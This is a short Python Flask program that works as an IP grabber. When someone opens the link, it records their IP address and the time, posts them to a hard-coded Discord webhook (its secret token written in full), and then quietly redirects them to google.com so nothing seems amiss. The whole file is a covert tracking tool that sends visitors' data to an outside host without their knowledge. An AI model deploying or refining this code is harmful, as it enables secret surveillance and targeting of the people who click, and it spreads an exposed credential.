from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1389671364117397594/jQhf499StnTMzV3J0s2suuI3_S6D7eHi40UNWJx4dY5eC8oSHUke0657sXN7cWB6Vmnr"
    data = {
        "content": None,
        "embeds": [
            {
                "title": "Visitor IP",
                "description": f"IP: {ip}\nTime: {date}",
                "color": 3447003
            }
        ]
    }
    try:
        response = requests.post(webhook_url, json=data)
        print("Webhook sent:", response.status_code)
    except Exception as e:
        print("Failed to send webhook:", e)

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"Visitor IP: {ip} at {date}")
    send_ip(ip, date)
    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
